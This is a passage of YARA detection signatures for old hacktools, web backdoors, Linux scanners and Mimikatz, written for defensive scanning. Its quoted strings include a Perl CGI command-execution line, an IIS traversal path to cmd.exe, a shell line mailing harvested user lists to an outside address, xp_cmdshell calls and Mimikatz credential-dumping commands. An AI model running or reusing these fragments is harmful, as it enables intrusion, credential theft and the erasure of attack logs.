		$s0 = "port - Port to listen on, defaults to 2323" fullword ascii
		$s1 = "Usage: srvcmd.exe [/h] [port]" fullword ascii
		$s3 = "Failed to execute shell" fullword ascii
		$s5 = "/h   - Hide Window" fullword ascii
		$s7 = "Accepted connection from client at %s" fullword ascii
		$s9 = "Error %d: %s" fullword ascii
	condition:
		all of them
}

rule Jc_ALL_WinEggDropShell_rar_Folder_Install_2 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Install.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "95866e917f699ee74d4735300568640ea1a05afd"
	strings:
		$s1 = "http://go.163.com/sdemo" fullword wide
		$s2 = "Player.tmp" fullword ascii
		$s3 = "Player.EXE" fullword wide
		$s4 = "mailto:sdemo@263.net" fullword ascii
		$s5 = "S-Player.exe" fullword ascii
		$s9 = "http://www.BaiXue.net (" fullword wide
	condition:
		all of them
}

rule sig_238_TFTPD32 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file TFTPD32.EXE"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "5c5f8c1a2fa8c26f015e37db7505f7c9e0431fe8"
	strings:
		$s0 = " http://arm.533.net" fullword ascii
		$s1 = "Tftpd32.hlp" fullword ascii
		$s2 = "Timeouts and Ports should be numerical and can not be 0" fullword ascii
		$s3 = "TFTPD32 -- " fullword wide
		$s4 = "%d -- %s" fullword ascii
		$s5 = "TIMEOUT while waiting for Ack block %d. file <%s>" fullword ascii
		$s12 = "TftpPort" fullword ascii
		$s13 = "Ttftpd32BackGround" fullword ascii
		$s17 = "SOFTWARE\\TFTPD32" fullword ascii
	condition:
		all of them
}

rule sig_238_iecv {
	meta:
		description = "Disclosed hacktool set (old stuff) - file iecv.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "6e6e75350a33f799039e7a024722cde463328b6d"
	strings:
		$s1 = "Edit The Content Of Cookie " fullword wide
		$s3 = "Accessories\\wordpad.exe" fullword ascii
		$s4 = "gorillanation.com" fullword ascii
		$s5 = "Before editing the content of a cookie, you should close all windows of Internet" ascii
		$s12 = "http://nirsoft.cjb.net" fullword ascii
	condition:
		all of them
}

rule Antiy_Ports_1_21 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Antiy Ports 1.21.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "ebf4bcc7b6b1c42df6048d198cbe7e11cb4ae3f0"
	strings:
		$s0 = "AntiyPorts.EXE" fullword wide
		$s7 = "AntiyPorts MFC Application" fullword wide
		$s20 = " @Stego:" fullword ascii
	condition:
		all of them
}

rule perlcmd_zip_Folder_cmd {
	meta:
		description = "Disclosed hacktool set (old stuff) - file cmd.cgi"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "21b5dc36e72be5aca5969e221abfbbdd54053dd8"
	strings:
		$s0 = "syswrite(STDOUT, \"Content-type: text/html\\r\\n\\r\\n\", 27);" fullword ascii
		$s1 = "s/%20/ /ig;" fullword ascii
		$s2 = "syswrite(STDOUT, \"\\r\\n</PRE></HTML>\\r\\n\", 17);" fullword ascii
		$s4 = "open(STDERR, \">&STDOUT\") || die \"Can't redirect STDERR\";" fullword ascii
		$s5 = "$_ = $ENV{QUERY_STRING};" fullword ascii
		$s6 = "$execthis = $_;" fullword ascii
		$s7 = "system($execthis);" fullword ascii
		$s12 = "s/%2f/\\//ig;" fullword ascii
	condition:
		6 of them
}

rule aspbackdoor_asp3 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file asp3.txt"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "e5588665ca6d52259f7d9d0f13de6640c4e6439c"
	strings:
		$s0 = "<form action=\"changepwd.asp\" method=\"post\"> " fullword ascii
		$s1 = "  Set oUser = GetObject(\"WinNT://ComputerName/\" & UserName) " fullword ascii
		$s2 = "    value=\"<%=Request.ServerVariables(\"LOGIN_USER\")%>\"> " fullword ascii
		$s14 = " Windows NT " fullword ascii
		$s16 = " WIndows 2000 " fullword ascii
		$s18 = "OldPwd = Request.Form(\"OldPwd\") " fullword ascii
		$s19 = "NewPwd2 = Request.Form(\"NewPwd2\") " fullword ascii
		$s20 = "NewPwd1 = Request.Form(\"NewPwd1\") " fullword ascii
	condition:
		all of them
}

rule sig_238_FPipe {
	meta:
		description = "Disclosed hacktool set (old stuff) - file FPipe.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "41d57d356098ff55fe0e1f0bcaa9317df5a2a45c"
	strings:
		$s0 = "made to port 80 of the remote machine at 192.168.1.101 with the" fullword ascii
		$s1 = "Unable to resolve hostname \"%s\"" fullword ascii
		$s2 = "source port for that outbound connection being set to 53 also." fullword ascii
		$s3 = " -s    - outbound source port number" fullword ascii
		$s5 = "http://www.foundstone.com" fullword ascii
		$s20 = "Attempting to connect to %s port %d" fullword ascii
	condition:
		all of them
}

rule sig_238_concon {
	meta:
		description = "Disclosed hacktool set (old stuff) - file concon.com"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "816b69eae66ba2dfe08a37fff077e79d02b95cc1"
	strings:
		$s0 = "Usage: concon \\\\ip\\sharename\\con\\con" fullword ascii
	condition:
		all of them
}

rule aspbackdoor_regdll {
	meta:
		description = "Disclosed hacktool set (old stuff) - file regdll.asp"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "5c5e16a00bcb1437bfe519b707e0f5c5f63a488d"
	strings:
		$s1 = "exitcode = oShell.Run(\"c:\\WINNT\\system32\\regsvr32.exe /u/s \" & strFile, 0, " ascii
		$s3 = "oShell.Run \"c:\\WINNT\\system32\\regsvr32.exe /u/s \" & strFile, 0, False" fullword ascii
		$s4 = "EchoB(\"regsvr32.exe exitcode = \" & exitcode)" fullword ascii
		$s5 = "Public Property Get oFS()" fullword ascii
	condition:
		all of them
}

rule CleanIISLog {
	meta:
		description = "Disclosed hacktool set (old stuff) - file CleanIISLog.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "827cd898bfe8aa7e9aaefbe949d26298f9e24094"
	strings:
		$s1 = "CleanIP - Specify IP Address Which You Want Clear." fullword ascii
		$s2 = "LogFile - Specify Log File Which You Want Process." fullword ascii
		$s8 = "CleanIISLog Ver" fullword ascii
		$s9 = "msftpsvc" fullword ascii
		$s10 = "Fatal Error: MFC initialization failed" fullword ascii
		$s11 = "Specified \"ALL\" Will Process All Log Files." fullword ascii
		$s12 = "Specified \".\" Will Clean All IP Record." fullword ascii
		$s16 = "Service %s Stopped." fullword ascii
		$s20 = "Process Log File %s..." fullword ascii
	condition:
		5 of them
}

rule sqlcheck {
	meta:
		description = "Disclosed hacktool set (old stuff) - file sqlcheck.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "5a5778ac200078b627db84fdc35bf5bcee232dc7"
	strings:
		$s0 = "Power by eyas<cooleyas@21cn.com>" fullword ascii
		$s3 = "\\ipc$ \"\" /user:\"\"" fullword ascii
		$s4 = "SQLCheck can only scan a class B network. Try again." fullword ascii
		$s14 = "Example: SQLCheck 192.168.0.1 192.168.0.254" fullword ascii
		$s20 = "Usage: SQLCheck <StartIP> <EndIP>" fullword ascii
	condition:
		3 of them
}

rule sig_238_RunAsEx {
	meta:
		description = "Disclosed hacktool set (old stuff) - file RunAsEx.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "a22fa4e38d4bf82041d67b4ac5a6c655b2e98d35"
	strings:
		$s0 = "RunAsEx By Assassin 2000. All Rights Reserved. http://www.netXeyes.com" fullword ascii
		$s8 = "cmd.bat" fullword ascii
		$s9 = "Note: This Program Can'nt Run With Local Machine." fullword ascii
		$s11 = "%s Execute Succussifully." fullword ascii
		$s12 = "winsta0" fullword ascii
		$s15 = "Usage: RunAsEx <UserName> <Password> <Execute File> [\"Execute Option\"]" fullword ascii
	condition:
		4 of them
}

rule sig_238_nbtdump {
	meta:
		description = "Disclosed hacktool set (old stuff) - file nbtdump.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "cfe82aad5fc4d79cf3f551b9b12eaf9889ebafd8"
	strings:
		$s0 = "Creation of results file - \"%s\" failed." fullword ascii
		$s1 = "c:\\>nbtdump remote-machine" fullword ascii
		$s7 = "Cerberus NBTDUMP" fullword ascii
		$s11 = "<CENTER><H1>Cerberus Internet Scanner</H1>" fullword ascii
		$s18 = "<P><H3>Account Information</H3><PRE>" fullword wide
		$s19 = "%s's password is %s</H3>" fullword wide
		$s20 = "%s's password is blank</H3>" fullword wide
	condition:
		5 of them
}

rule sig_238_Glass2k {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Glass2k.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "b05455a1ecc6bc7fc8ddef312a670f2013704f1a"
	strings:
		$s0 = "Portions Copyright (c) 1997-1999 Lee Hasiuk" fullword ascii
		$s1 = "C:\\Program Files\\Microsoft Visual Studio\\VB98" fullword ascii
		$s3 = "WINNT\\System32\\stdole2.tlb" fullword ascii
		$s4 = "Glass2k.exe" fullword wide
		$s7 = "NeoLite Executable File Compressor" fullword ascii
	condition:
		all of them
}

rule SplitJoin_V1_3_3_rar_Folder_3 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file splitjoin.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "21409117b536664a913dcd159d6f4d8758f43435"
	strings:
		$s2 = "ie686@sohu.com" fullword ascii
		$s3 = "splitjoin.exe" fullword ascii
		$s7 = "SplitJoin" fullword ascii
	condition:
		all of them
}

rule aspbackdoor_EDIT {
	meta:
		description = "Disclosed hacktool set (old stuff) - file EDIT.ASP"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "12196cf62931cde7b6cb979c07bb5cc6a7535cbb"
	strings:
		$s1 = "<meta HTTP-EQUIV=\"Content-Type\" CONTENT=\"text/html;charset=gb_2312-80\">" fullword ascii
		$s2 = "Set thisfile = fs.GetFile(whichfile)" fullword ascii
		$s3 = "response.write \"<a href='index.asp'>" fullword ascii
		$s5 = "if Request.Cookies(\"password\")=\"juchen\" then " fullword ascii
		$s6 = "Set thisfile = fs.OpenTextFile(whichfile, 1, False)" fullword ascii
		$s7 = "color: rgb(255,0,0); text-decoration: underline }" fullword ascii
		$s13 = "if Request(\"creat\")<>\"yes\" then" fullword ascii
	condition:
		5 of them
}

rule aspbackdoor_entice {
	meta:
		description = "Disclosed hacktool set (old stuff) - file entice.asp"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "e273a1b9ef4a00ae4a5d435c3c9c99ee887cb183"
	strings:
		$s0 = "<Form Name=\"FormPst\" Method=\"Post\" Action=\"entice.asp\">" fullword ascii
		$s2 = "if left(trim(request(\"sqllanguage\")),6)=\"select\" then" fullword ascii
		$s4 = "conndb.Execute(sqllanguage)" fullword ascii
		$s5 = "<!--#include file=sqlconn.asp-->" fullword ascii
		$s6 = "rstsql=\"select * from \"&rstable(\"table_name\")" fullword ascii
	condition:
		all of them
}

rule FPipe2_0 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file FPipe2.0.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "891609db7a6787575641154e7aab7757e74d837b"
	strings:
		$s0 = "made to port 80 of the remote machine at 192.168.1.101 with the" fullword ascii
		$s1 = "Unable to resolve hostname \"%s\"" fullword ascii
		$s2 = " -s    - outbound connection source port number" fullword ascii
		$s3 = "source port for that outbound connection being set to 53 also." fullword ascii
		$s4 = "http://www.foundstone.com" fullword ascii
		$s19 = "FPipe" fullword ascii
	condition:
		all of them
}

rule InstGina {
	meta:
		description = "Disclosed hacktool set (old stuff) - file InstGina.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "5317fbc39508708534246ef4241e78da41a4f31c"
	strings:
		$s0 = "To Open Registry" fullword ascii
		$s4 = "I love Candy very much!!" ascii
		$s5 = "GinaDLL" fullword ascii
	condition:
		all of them
}

rule ArtTray_zip_Folder_ArtTray {
	meta:
		description = "Disclosed hacktool set (old stuff) - file ArtTray.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "ee1edc8c4458c71573b5f555d32043cbc600a120"
	strings:
		$s0 = "http://www.brigsoft.com" fullword wide
		$s2 = "ArtTrayHookDll.dll" fullword ascii
		$s3 = "ArtTray Version 1.0 " fullword wide
		$s16 = "TRM_HOOKCALLBACK" fullword ascii
	condition:
		all of them
}

rule sig_238_findoor {
	meta:
		description = "Disclosed hacktool set (old stuff) - file findoor.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "cdb1ececceade0ecdd4479ecf55b0cc1cf11cdce"
	strings:
		$s0 = "(non-Win32 .EXE or error in .EXE image)." fullword ascii
		$s8 = "PASS hacker@hacker.com" fullword ascii
		$s9 = "/scripts/..%c1%1c../winnt/system32/cmd.exe" fullword ascii
		$s10 = "MAIL FROM:hacker@hacker.com" fullword ascii
		$s11 = "http://isno.yeah.net" fullword ascii
	condition:
		4 of them
}

rule aspbackdoor_ipclear {
	meta:
		description = "Disclosed hacktool set (old stuff) - file ipclear.vbs"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "9f8fdfde4b729516330eaeb9141fb2a7ff7d0098"
	strings:
		$s0 = "Set ServiceObj = GetObject(\"WinNT://\" & objNet.ComputerName & \"/w3svc\")" fullword ascii
		$s1 = "wscript.Echo \"USAGE:KillLog.vbs LogFileName YourIP.\"" fullword ascii
		$s2 = "Set txtStreamOut = fso.OpenTextFile(destfile, ForWriting, True)" fullword ascii
		$s3 = "Set objNet = WScript.CreateObject( \"WScript.Network\" )" fullword ascii
		$s4 = "Set fso = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
	condition:
		all of them
}

rule WinEggDropShellFinal_zip_Folder_InjectT {
	meta:
		description = "Disclosed hacktool set (old stuff) - file InjectT.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "516e80e4a25660954de8c12313e2d7642bdb79dd"
	strings:
		$s0 = "Packed by exe32pack" ascii
		$s1 = "2TInject.Dll" fullword ascii
		$s2 = "Windows Services" fullword ascii
		$s3 = "Findrst6" fullword ascii
		$s4 = "Press Any Key To Continue......" fullword ascii
	condition:
		all of them
}

rule sig_238_rshsvc {
	meta:
		description = "Disclosed hacktool set (old stuff) - file rshsvc.bat"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "fb15c31254a21412aecff6a6c4c19304eb5e7d75"
	strings:
		$s0 = "if not exist %1\\rshsetup.exe goto ERROR2" fullword ascii
		$s1 = "ECHO rshsetup.exe is not found in the %1 directory" fullword ascii
		$s9 = "REM %1 directory must have rshsetup.exe,rshsvc.exe and rshsvc.dll" fullword ascii
		$s10 = "copy %1\\rshsvc.exe" fullword ascii
		$s12 = "ECHO Use \"net start rshsvc\" to start the service." fullword ascii
		$s13 = "rshsetup %SystemRoot%\\system32\\rshsvc.exe %SystemRoot%\\system32\\rshsvc.dll" fullword ascii
		$s18 = "pushd %SystemRoot%\\system32" fullword ascii
	condition:
		all of them
}

rule gina_zip_Folder_gina {
	meta:
		description = "Disclosed hacktool set (old stuff) - file gina.dll"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "e0429e1b59989cbab6646ba905ac312710f5ed30"
	strings:
		$s0 = "NEWGINA.dll" fullword ascii
		$s1 = "LOADER ERROR" fullword ascii
		$s3 = "WlxActivateUserShell" fullword ascii
		$s6 = "WlxWkstaLockedSAS" fullword ascii
		$s13 = "WlxIsLockOk" fullword ascii
		$s14 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword ascii
		$s16 = "WlxShutdown" fullword ascii
		$s17 = "The ordinal %u could not be located in the dynamic link library %s" fullword ascii
	condition:
		all of them
}

rule superscan3_0 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file superscan3.0.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "a9a02a14ea4e78af30b8b4a7e1c6ed500a36bc4d"
	strings:
		$s0 = "\\scanner.ini" fullword ascii
		$s1 = "\\scanner.exe" fullword ascii
		$s2 = "\\scanner.lst" fullword ascii
		$s4 = "\\hensss.lst" fullword ascii
		$s5 = "STUB32.EXE" fullword wide
		$s6 = "STUB.EXE" fullword wide
		$s8 = "\\ws2check.exe" fullword ascii
		$s9 = "\\trojans.lst" fullword ascii
		$s10 = "1996 InstallShield Software Corporation" fullword wide
	condition:
		all of them
}

rule sig_238_xsniff {
	meta:
		description = "Disclosed hacktool set (old stuff) - file xsniff.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "d61d7329ac74f66245a92c4505a327c85875c577"
	strings:
		$s2 = "xsiff.exe -pass -hide -log pass.log" fullword ascii
		$s3 = "%s - simple sniffer for win2000" fullword ascii
		$s4 = "xsiff.exe -tcp -udp -asc -addr 192.168.1.1" fullword ascii
		$s5 = "HOST: %s USER: %s, PASS: %s" fullword ascii
		$s7 = "http://www.xfocus.org" fullword ascii
		$s9 = "  -pass        : Filter username/password" fullword ascii
		$s18 = "  -udp         : Output udp packets" fullword ascii
		$s19 = "Code by glacier <glacier@xfocus.org>" fullword ascii
		$s20 = "  -tcp         : Output tcp packets" fullword ascii
	condition:
		6 of them
}

rule sig_238_fscan {
	meta:
		description = "Disclosed hacktool set (old stuff) - file fscan.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "d5646e86b5257f9c83ea23eca3d86de336224e55"
	strings:
		$s0 = "FScan v1.12 - Command line port scanner." fullword ascii
		$s2 = " -n    - no port scanning - only pinging (unless you use -q)" fullword ascii
		$s5 = "Example: fscan -bp 80,100-200,443 10.0.0.1-10.0.1.200" fullword ascii
		$s6 = " -z    - maximum simultaneous threads to use for scanning" fullword ascii
		$s12 = "Failed to open the IP list file \"%s\"" fullword ascii
		$s13 = "http://www.foundstone.com" fullword ascii
		$s16 = " -p    - TCP port(s) to scan (a comma separated list of ports/ranges) " fullword ascii
		$s18 = "Bind port number out of range. Using system default." fullword ascii
		$s19 = "fscan.exe" fullword wide
	condition:
		4 of them
}

rule _iissample_nesscan_twwwscan {
	meta:
		description = "Disclosed hacktool set (old stuff) - from files iissample.exe, nesscan.exe, twwwscan.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		super_rule = 1
		hash0 = "7f20962bbc6890bf48ee81de85d7d76a8464b862"
		hash1 = "c0b1a2196e82eea4ca8b8c25c57ec88e4478c25b"
		hash2 = "548f0d71ef6ffcc00c0b44367ec4b3bb0671d92f"
	strings:
		$s0 = "Connecting HTTP Port - Result: " fullword
		$s1 = "No space for command line argument vector" fullword
		$s3 = "Microsoft(July/1999~) http://www.microsoft.com/technet/security/current.asp" fullword
		$s5 = "No space for copy of command line" fullword
		$s7 = "-  Windows NT,2000 Patch Method  - " fullword
		$s8 = "scanf : floating point formats not linked" fullword
		$s12 = "hrdir_b.c: LoadLibrary != mmdll borlndmm failed" fullword
		$s13 = "!\"what?\"" fullword
		$s14 = "%s Port %d Closed" fullword
		$s16 = "printf : floating point formats not linked" fullword
		$s17 = "xxtype.cpp" fullword
	condition:
		all of them
}

rule _FsHttp_FsPop_FsSniffer {
	meta:
		description = "Disclosed hacktool set (old stuff) - from files FsHttp.exe, FsPop.exe, FsSniffer.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		super_rule = 1
		hash0 = "9d4e7611a328eb430a8bb6dc7832440713926f5f"
		hash1 = "ae23522a3529d3313dd883727c341331a1fb1ab9"
		hash2 = "7ffc496cd4a1017485dfb571329523a52c9032d8"
	strings:
		$s0 = "-ERR Invalid Command, Type [Help] For Command List" fullword
		$s1 = "-ERR Get SMS Users ID Failed" fullword
		$s2 = "Control Time Out 90 Secs, Connection Closed" fullword
		$s3 = "-ERR Post SMS Failed" fullword
		$s4 = "Current.hlt" fullword
		$s6 = "Histroy.hlt" fullword
		$s7 = "-ERR Send SMS Failed" fullword
		$s12 = "-ERR Change Password <New Password>" fullword
		$s17 = "+OK Send SMS Succussifully" fullword
		$s18 = "+OK Set New Password: [%s]" fullword
		$s19 = "CHANGE PASSWORD" fullword
	condition:
		all of them
}

rule Ammyy_Admin_AA_v3 {
	meta:
		description = "Remote Admin Tool used by APT group Anunak (ru) - file AA_v3.4.exe and AA_v3.5.exe"
		author = "Florian Roth"
		reference = "http://goo.gl/gkAg2E"
		date = "2014/12/22"
		score = 55
		hash1 = "b130611c92788337c4f6bb9e9454ff06eb409166"
		hash2 = "07539abb2623fe24b9a05e240f675fa2d15268cb"
	strings:
		$x1 = "S:\\Ammyy\\sources\\target\\TrService.cpp" fullword ascii
		$x2 = "S:\\Ammyy\\sources\\target\\TrDesktopCopyRect.cpp" fullword ascii
		$x3 = "Global\\Ammyy.Target.IncomePort" fullword ascii
		$x4 = "S:\\Ammyy\\sources\\target\\TrFmFileSys.cpp" fullword ascii
		$x5 = "Please enter password for accessing remote computer" fullword ascii

		$s1 = "CreateProcess1()#3 %d error=%d" fullword ascii
		$s2 = "CHttpClient::SendRequest2(%s, %s, %d) error: invalid host name." fullword ascii
		$s3 = "ERROR: CreateProcessAsUser() error=%d, session=%d" fullword ascii
		$s4 = "ERROR: FindProcessByName('explorer.exe')" fullword ascii
	condition:
		2 of ($x*) or all of ($s*)
}

/* Other dumper and custom hack tools */

rule LinuxHacktool_eyes_screen {
	meta:
		description = "Linux hack tools - file screen"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/01/19"
		hash = "a240a0118739e72ff89cefa2540bf0d7da8f8a6c"
	strings:
		$s0 = "or: %s -r [host.tty]" fullword ascii
		$s1 = "%s: process: character, ^x, or (octal) \\032 expected." fullword ascii
		$s2 = "Type \"screen [-d] -r [pid.]tty.host\" to resume one of them." fullword ascii
		$s6 = "%s: at [identifier][%%|*|#] command [args]" fullword ascii
		$s8 = "Slurped only %d characters (of %d) into buffer - try again" fullword ascii
		$s11 = "command from %s: %s %s" fullword ascii
		$s16 = "[ Passwords don't match - your armor crumbles away ]" fullword ascii
		$s19 = "[ Passwords don't match - checking turned off ]" fullword ascii
	condition:
		all of them
}

rule LinuxHacktool_eyes_scanssh {
	meta:
		description = "Linux hack tools - file scanssh"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/01/19"
		hash = "467398a6994e2c1a66a3d39859cde41f090623ad"
	strings:
		$s0 = "Connection closed by remote host" fullword ascii
		$s1 = "Writing packet : error on socket (or connection closed): %s" fullword ascii
		$s2 = "Remote connection closed by signal SIG%s %s" fullword ascii
		$s4 = "Reading private key %s failed (bad passphrase ?)" fullword ascii
		$s5 = "Server closed connection" fullword ascii
		$s6 = "%s: line %d: list delimiter not followed by keyword" fullword ascii
		$s8 = "checking for version `%s' in file %s required by file %s" fullword ascii
		$s9 = "Remote host closed connection" fullword ascii
		$s10 = "%s: line %d: bad command `%s'" fullword ascii
		$s13 = "verifying that server is a known host : file %s not found" fullword ascii
		$s14 = "%s: line %d: expected service, found `%s'" fullword ascii
		$s15 = "%s: line %d: list delimiter not followed by domain" fullword ascii
		$s17 = "Public key from server (%s) doesn't match user preference (%s)" fullword ascii
	condition:
		all of them
}

rule LinuxHacktool_eyes_pscan2 {
	meta:
		description = "Linux hack tools - file pscan2"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/01/19"
		hash = "56b476cba702a4423a2d805a412cae8ef4330905"
	strings:
		$s0 = "# pscan completed in %u seconds. (found %d ips)" fullword ascii
		$s1 = "Usage: %s <b-block> <port> [c-block]" fullword ascii
		$s3 = "%s.%d.* (total: %d) (%.1f%% done)" fullword ascii
		$s8 = "Invalid IP." fullword ascii
		$s9 = "# scanning: " fullword ascii
		$s10 = "Unable to allocate socket." fullword ascii
	condition:
		2 of them
}

rule LinuxHacktool_eyes_a {
	meta:
		description = "Linux hack tools - file a"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/01/19"
		hash = "458ada1e37b90569b0b36afebba5ade337ea8695"
	strings:
		$s0 = "cat trueusers.txt | mail -s \"eyes\" clubby@slucia.com" fullword ascii
		$s1 = "mv scan.log bios.txt" fullword ascii
		$s2 = "rm -rf bios.txt" fullword ascii
		$s3 = "echo -e \"# by Eyes.\"" fullword ascii
		$s4 = "././pscan2 $1 22" fullword ascii
		$s10 = "echo \"#cautam...\"" fullword ascii
	condition:
		2 of them
}

rule LinuxHacktool_eyes_mass {
	meta:
		description = "Linux hack tools - file mass"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/01/19"
		hash = "2054cb427daaca9e267b252307dad03830475f15"
	strings:
		$s0 = "cat trueusers.txt | mail -s \"eyes\" clubby@slucia.com" fullword ascii
		$s1 = "echo -e \"${BLU}Private Scanner By Raphaello , DeMMoNN , tzepelush & DraC\\n\\r" ascii
		$s3 = "killall -9 pscan2" fullword ascii
		$s5 = "echo \"[*] ${DCYN}Gata esti h4x0r ;-)${RES}  [*]\"" fullword ascii
		$s6 = "echo -e \"${DCYN}@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#${RES}\"" fullword ascii
	condition:
		1 of them
}

rule LinuxHacktool_eyes_pscan2_2 {
	meta:
		description = "Linux hack tools - file pscan2.c"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/01/19"
		hash = "eb024dfb441471af7520215807c34d105efa5fd8"
	strings:
		$s0 = "snprintf(outfile, sizeof(outfile) - 1, \"scan.log\", argv[1], argv[2]);" fullword ascii
		$s2 = "printf(\"Usage: %s <b-block> <port> [c-block]\\n\", argv[0]);" fullword ascii
		$s3 = "printf(\"\\n# pscan completed in %u seconds. (found %d ips)\\n\", (time(0) - sca" ascii
		$s19 = "connlist[i].addr.sin_family = AF_INET;" fullword ascii
		$s20 = "snprintf(last, sizeof(last) - 1, \"%s.%d.* (total: %d) (%.1f%% done)\"," fullword ascii
	condition:
		2 of them
}

rule CN_Portscan : APT
{
    meta:
        description = "CN Port Scanner"
        author = "Florian Roth"
        release_date = "2013-11-29"
        confidential = false
		score = 70
    strings:
    	$s1 = "MZ"
		$s2 = "TCP 12.12.12.12"
    condition:
        ($s1 at 0) and $s2
}

rule WMI_vbs : APT
{
    meta:
        description = "WMI Tool - APT"
        author = "Florian Roth"
        release_date = "2013-11-29"
        confidential = false
		score = 70
    strings:
		$s3 = "WScript.Echo \"   $$\\      $$\\ $$\\      $$\\ $$$$$$\\ $$$$$$$$\\ $$\\   $$\\ $$$$$$$$\\  $$$$$$"
    condition:
        all of them
}

rule CN_Toolset__XScanLib_XScanLib_XScanLib {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - from files XScanLib.dll, XScanLib.dll, XScanLib.dll"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		reference2 = "https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar"
		date = "2015/03/30"
		score = 70
		super_rule = 1
		hash0 = "af419603ac28257134e39683419966ab3d600ed2"
		hash1 = "c5cb4f75cf241f5a9aea324783193433a42a13b0"
		hash2 = "135f6a28e958c8f6a275d8677cfa7cb502c8a822"
	strings:
		$s1 = "Plug-in thread causes an exception, failed to alert user." fullword
		$s2 = "PlugGetUdpPort" fullword
		$s3 = "XScanLib.dll" fullword
		$s4 = "PlugGetTcpPort" fullword
		$s11 = "PlugGetVulnNum" fullword
	condition:
		all of them
}


rule CN_Toolset_LScanPortss_2 {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file LScanPortss.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		reference2 = "https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar"
		date = "2015/03/30"
		score = 70
		hash = "4631ec57756466072d83d49fbc14105e230631a0"
	strings:
		$s1 = "LScanPort.EXE" fullword wide
		$s3 = "www.honker8.com" fullword wide
		$s4 = "DefaultPort.lst" fullword ascii
		$s5 = "Scan over.Used %dms!" fullword ascii
		$s6 = "www.hf110.com" fullword wide
		$s15 = "LScanPort Microsoft " fullword wide
		$s18 = "L-ScanPort2.0 CooFly" fullword wide
	condition:
		4 of them
}

rule CN_Toolset_sig_1433_135_sqlr {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file sqlr.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		reference2 = "https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar"
		date = "2015/03/30"
		score = 70
		hash = "8542c7fb8291b02db54d2dc58cd608e612bfdc57"
	strings:
		$s0 = "Connect to %s MSSQL server success. Type Command at Prompt." fullword ascii
		$s11 = ";DATABASE=master" fullword ascii
		$s12 = "xp_cmdshell '" fullword ascii
		$s14 = "SELECT * FROM OPENROWSET('SQLOLEDB','Trusted_Connection=Yes;Data Source=myserver" ascii
	condition:
		all of them
}


/* Mimikatz */

rule Mimikatz_Memory_Rule_1 : APT {
	meta:
		author = "Florian Roth"
		date = "12/22/2014"
		score = 70
		type = "memory"
		description = "Detects password dumper mimikatz in memory"
	strings:
		$s1 = "sekurlsa::msv" fullword ascii
	    $s2 = "sekurlsa::wdigest" fullword ascii
	    $s4 = "sekurlsa::kerberos" fullword ascii
	    $s5 = "sekurlsa::tspkg" fullword ascii
	    $s6 = "sekurlsa::livessp" fullword ascii
	    $s7 = "sekurlsa::ssp" fullword ascii
	    $s8 = "sekurlsa::logonPasswords" fullword ascii
	    $s9 = "sekurlsa::process" fullword ascii
	    $s10 = "ekurlsa::minidump" fullword ascii
	    $s11 = "sekurlsa::pth" fullword ascii
	    $s12 = "sekurlsa::tickets" fullword ascii
	    $s13 = "sekurlsa::ekeys" fullword ascii
